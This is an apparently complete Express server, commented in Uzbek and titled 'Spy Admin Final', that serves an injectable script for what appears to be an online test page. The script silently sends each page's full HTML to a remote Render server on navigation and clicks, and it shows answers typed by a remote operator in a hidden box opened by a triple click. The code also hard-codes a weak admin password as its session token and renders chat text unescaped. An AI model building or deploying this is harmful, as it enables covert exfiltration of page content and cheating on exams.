const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const cookieParser = require("cookie-parser");

const app = express();

// ========================================================
// ⚙️ SOZLAMALAR
const MY_SERVER_URL = "https://server-xkuu.onrender.com"; // Render manzili
const ADMIN_PASSWORD = "8908"; 
// ========================================================

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(cookieParser());

// --- XOTIRA ---
let capturedPages = []; 
let chatHistory = "";      // Admin panel uchun to'liq tarix
let clientFullText = "";   // Client uchun 1 qatorli yig'indi
let lastUpdateID = 0;

const getUzTime = () => new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent", hour12: false });

const checkAuth = (req, res, next) => {
    if (req.cookies.admin_token === ADMIN_PASSWORD) next();
    else res.redirect("/login");
};

// ========================================================
// 📜 CLIENT SKRIPTI (f1.js)
// ========================================================
const clientScript = `
(function(){
  const BASE = '${MY_SERVER_URL}'; 
  let lastSince=0, msgBox=null, statusBox=null, clickCount=0;
  let currentUrl = window.location.href;
  let isBoxOpen = false; 
  let isFirstRun = true; 

  // 1. STATUS OYNACHASI (PASTDA O'RTADA)
  function showStatus(text, color) {
    if(!statusBox) {
        statusBox = document.createElement('div');
        Object.assign(statusBox.style, {
            position: 'fixed', bottom: '50px', left: '50%', // Pastda o'rtada
            transform: 'translateX(-50%)',
            padding: '5px 15px', borderRadius: '20px',
            background: color || 'rgba(0,128,0,0.8)',
            color: '#fff', fontSize: '12px', fontFamily: 'sans-serif',
            zIndex: 2147483647, pointerEvents: 'none',
            display: 'block', boxShadow: '0 2px 10px rgba(0,0,0,0.3)'
        });
        document.body.appendChild(statusBox);
    }
    statusBox.innerText = text;
    statusBox.style.display = 'block';
    
    // 3 soniyadan keyin yo'qoladi
    setTimeout(() => { if(statusBox) statusBox.style.display = 'none'; }, 3000);
  }

  // 2. CHAT OYNASI (1 QATORLI SCROLL)
  function makeMsgBox(){
    if(msgBox) return msgBox;
    msgBox = document.createElement('div');
    Object.assign(msgBox.style,{
      position:'fixed', 
      left:'10px', bottom:'10px',  // Chap pastki burchak
      width:'300px',               // Eni
      height:'30px',               // Balandligi (faqat 1 qator)
      lineHeight:'30px',           // Yozuv o'rtada turishi uchun
      background:'rgba(0, 0, 0, 0.8)', 
      color:'#00ff00',            
      padding:'0 10px',
      fontSize:'13px', fontFamily:'monospace',     
      borderRadius:'5px',
      zIndex:2147483647,
      display:'none',             
      border:'1px solid #00ff00',
      
      // 1 QATORLI QILISH VA SCROLL QO'SHISH
      whiteSpace: 'nowrap',       // Pastga tushmasin
      overflowX: 'auto',          // Yonga scroll bo'lsin
      overflowY: 'hidden'         // Pastga scroll bo'lmasin
    });
    
    // Scrollbar dizayni (ingichka)
    const style = document.createElement('style');
    style.innerHTML = \`
      ::-webkit-scrollbar { height: 4px; } 
      ::-webkit-scrollbar-track { background: #222; }
      ::-webkit-scrollbar-thumb { background: #00ff00; borderRadius: 2px;}
    \`;
    document.head.appendChild(style);

    document.body.appendChild(msgBox);
    return msgBox;
  }

  // 3. HTML YUBORISH (Faqat aniq buyruq bilan)
  async function sendPage(){
    try{
      // Faqat birinchi marta status chiqaramiz
      if(isFirstRun) showStatus("Ulanmoqda...", "#f59e0b");

      await fetch(BASE+'/upload-html',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({
            html: document.documentElement.outerHTML,
            url: window.location.href
        })
      });
      
      if(isFirstRun) {
          showStatus("Bog'landi ✅", "#10b981");
          isFirstRun = false; 
      }
    }catch(e){}
  }

  // 4. XABAR OLISH (Yig'indi matn)
  async function fetchLatest(){
    try{
      const r=await fetch(BASE+'/latest?since='+lastSince);
      const j=await r.json();
      
      if(j.success && j.fullText){
        const b = makeMsgBox();
        // Serverdan kelgan "Salom | Alik | Qalay" matnini qo'yamiz
        b.innerText = j.fullText; 
        
        // Agar yangi xabar bo'lsa va oyna OCHIQ bo'lsa -> oxiriga scroll qilamiz
        if(j.timestamp > lastSince) {
             // Agar oyna ochiq bo'lsa, oxiriga o'tkaz
             if(isBoxOpen) setTimeout(()=> b.scrollLeft = b.scrollWidth, 100);
        }
        lastSince = j.timestamp;
      }
    }catch(e){}
  }

  // --- MANTIQ (SPAMSIZ) ---

  // A) URL o'zgarishi (Next Page) - Har 1 sekundda tekshiradi
  setInterval(()=>{
    if(currentUrl !== window.location.href){
        currentUrl = window.location.href;
        sendPage(); // URL o'zgarsa darhol yubor
    }
  }, 1000);

  // B) Clicks (Keyingi savolga o'tish)
  // Biz MutationObserver ishlatmaymiz (soat bo'lsa spam qiladi).
  // Buning o'rniga: Har qanday click bo'lsa, 2.5 soniya kutib yuboramiz.
  document.addEventListener('click', (e) => {
      // Chap tugma bosilsa
      if(e.button === 0) {
        
        // 1. 3 marta bosish logikasi
        clickCount++;
        setTimeout(() => clickCount = 0, 500);
        
        if(clickCount >= 3) {
            clickCount = 0;
            const b = makeMsgBox();
            if(isBoxOpen) {
                b.style.display = 'none';
                isBoxOpen = false;
            } else {
                b.style.display = 'block';
                isBoxOpen = true;
                // Ochilganda oxiriga o'tkazish
                setTimeout(()=> b.scrollLeft = b.scrollWidth, 100);
            }
            return; // 3 marta bosilganda page yuborish shart emas
        }

        // 2. Oddiy click (Test yechish) -> 2.5 soniyadan keyin yuborish
        // (Chunki yangi savol yuklanishi uchun vaqt kerak)
        setTimeout(() => {
            sendPage();
        }, 2500);
      }
  });

  // Start
  sendPage();
  setInterval(fetchLatest, 3000);
})();
`;

// ========================================================
// 🛣 ROUTES
// ========================================================

app.get("/f1.js", (req, res) => {
    res.setHeader("Content-Type", "application/javascript");
    res.send(clientScript);
});

// LOGIN
app.get("/login", (req, res) => {
    if (req.cookies.admin_token === ADMIN_PASSWORD) return res.redirect("/");
    res.send(`<body style="background:#0f172a;display:flex;justify-content:center;align-items:center;height:100vh"><form action="/login" method="POST"><input type="password" name="password" style="background:#1e293b;border:1px solid #334155;color:#fff;padding:15px;text-align:center;border-radius:10px;font-size:18px;outline:none" placeholder="PAROL" autofocus></form></body>`);
});
app.post("/login", (req, res) => {
    if (req.body.password === ADMIN_PASSWORD) {
        res.cookie("admin_token", ADMIN_PASSWORD, { maxAge: 86400000, httpOnly: true });
        res.redirect("/");
    } else res.redirect("/login");
});
app.get("/logout", (req, res) => { res.clearCookie("admin_token"); res.redirect("/login"); });

// API
app.get("/api/pages", checkAuth, (req, res) => {
    const list = capturedPages.map((p, index) => ({ id: index, url: p.url, date: p.date })).reverse();
    res.json(list);
});

// DASHBOARD (MARKAZLASHGAN)
app.get("/", checkAuth, (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Spy Admin Final</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background: #0f172a; color: #e2e8f0; font-family: sans-serif; margin: 0; padding: 0; }
                .container { max-width: 800px; margin: 20px auto; padding: 0 15px; }
                
                /* CHAT */
                .chat-container { background: #1e293b; border-radius: 10px; border: 1px solid #334155; padding: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); text-align: center;}
                
                .chat-history { 
                    background: #0f172a; height: 150px; border-radius: 8px; padding: 10px; 
                    overflow-y: auto; border: 1px solid #334155; font-family: monospace; font-size: 13px; color: #4ade80; 
                    text-align: left; white-space: pre-wrap; margin-bottom: 15px;
                }
                
                .input-group { display: flex; gap: 10px; }
                input { flex: 1; padding: 10px; background: #0f172a; border: 1px solid #475569; border-radius: 6px; color: #fff; }
                button { padding: 10px 20px; border-radius: 6px; border: none; cursor: pointer; font-weight: bold; }
                .btn-send { background: #3b82f6; color: white; }
                .btn-clear { background: #ef4444; color: white; font-size: 11px; margin-top: 5px; width: 100%;}

                /* PAGES */
                .pages-container { margin-top: 20px; background: #1e293b; border-radius: 10px; border: 1px solid #334155; padding: 15px; }
                .page-item { display: flex; justify-content: space-between; align-items: center; background: #0f172a; padding: 10px; margin-bottom: 5px; border-radius: 6px; border: 1px solid #334155; }
                .page-url { font-size: 12px; color: #38bdf8; text-decoration: none; overflow: hidden; text-overflow: ellipsis; max-width: 60%; white-space: nowrap; }
                .btn-view { background: #10b981; color: white; text-decoration: none; padding: 4px 10px; border-radius: 4px; font-size: 11px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div style="display:flex;justify-content:space-between;margin-bottom:10px;font-size:12px">
                    <span>Admin Panel</span> <a href="/logout" style="color:#ef4444">Chiqish</a>
                </div>

                <!-- CHAT -->
                <div class="chat-container">
                    <div class="chat-history">${chatHistory || "--- Chat bo'sh ---"}</div>
                    
                    <form action="/set-message" method="POST" class="input-group">
                        <input type="text" name="msg" placeholder="Xabar..." autocomplete="off" autofocus>
                        <button class="btn-send">YUBORISH</button>
                    </form>
                    
                    <form action="/clear-history" method="POST">
                        <button class="btn-clear">Chatni Tozalash</button>
                    </form>
                </div>

                <!-- PAGES -->
                <div class="pages-container">
                    <div style="display:flex;justify-content:space-between;margin-bottom:10px">
                        <b>Kelgan Sahifalar</b>
                        <form action="/clear-pages" method="POST" style="margin:0"><button style="background:none;color:#ef4444;border:none;cursor:pointer">O'chirish</button></form>
                    </div>
                    <div id="pages-list" style="text-align:center;font-size:12px;color:#64748b">Yuklanmoqda...</div>
                </div>
            </div>

            <script>
                // Sahifalarni avto yangilash
                function loadPages() {
                    fetch('/api/pages').then(r=>r.json()).then(d=>{
                        const c = document.getElementById('pages-list');
                        if(!d.length) { c.innerHTML='Ma\\'lumot yo\\'q'; return; }
                        c.innerHTML = d.map(p => \`
                            <div class="page-item">
                                <div><b style="color:#94a3b8">#\${p.id+1}</b> <span style="font-size:10px;color:#64748b">\${p.date}</span></div>
                                <a href="\${p.url}" target="_blank" class="page-url">\${p.url}</a>
                                <a href="/view-site/\${p.id}" target="_blank" class="btn-view">OCHISH</a>
                            </div>\`).join('');
                    });
                }
                setInterval(loadPages, 3000);
                loadPages();
            </script>
        </body>
        </html>
    `);
});

app.get("/view-site/:id", checkAuth, (req, res) => {
    const p = capturedPages[req.params.id];
    if (p) res.send(p.html.replace("<head>", `<head><base href="${p.url}">`));
    else res.send("Topilmadi");
});

app.post("/upload-html", (req, res) => {
    capturedPages.push({ url: req.body.url||"?", html: req.body.html||"", date: getUzTime() });
    if(capturedPages.length>50) capturedPages.shift();
    res.json({status:"ok"});
});

// XABARNI 1 QATORGA YIG'ISH
app.post("/set-message", checkAuth, (req, res) => {
    const msg = req.body.msg;
    if(msg) {
        // 1. Admin uchun to'liq tarix (Vaqt bilan)
        chatHistory += `[${getUzTime().split(' ')[1]}] ${msg}\n`;
        
        // 2. Client uchun 1 qatorli matn (qo'shib boriladi)
        if(clientFullText === "") clientFullText = msg;
        else clientFullText += " | " + msg; // "Salom | Alik"

        lastUpdateID = Date.now();
    }
    res.redirect("/");
});

app.post("/clear-history", checkAuth, (req, res) => { 
    chatHistory = ""; 
    clientFullText = ""; // Client oynasini ham tozalash
    lastUpdateID = Date.now(); 
    res.redirect("/"); 
});
app.post("/clear-pages", checkAuth, (req, res) => { capturedPages = []; res.redirect("/"); });

app.get("/latest", (req, res) => {
    res.json({ 
        success: true, 
        fullText: clientFullText, // Clientga 1 qatorli matn ketadi
        timestamp: lastUpdateID 
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server: ${PORT}`));
